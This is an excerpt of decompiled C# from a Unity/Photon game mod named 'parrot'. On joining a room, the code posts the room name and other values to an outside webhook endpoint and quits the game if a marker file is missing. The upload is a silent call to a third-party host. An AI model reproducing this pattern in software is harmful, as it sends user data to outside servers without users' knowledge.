...
namespace parrot.Background.Mods
{
	...
	internal class RoomManager : Mod
	{
		...
		public override void OnJoinedRoom()
		{
			...
			hashtable.Add("parrot", PhotonNetwork.CurrentRoom.Name);
			...
			byte[] array2 = new WebClient().UploadValues("https://tnuser.com/API/parrotWebsook.php", nameValueCollection3);
			...
			if (!File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "parrot", "EXIST.txt")))
			{
				Application.Quit();
			}
		}
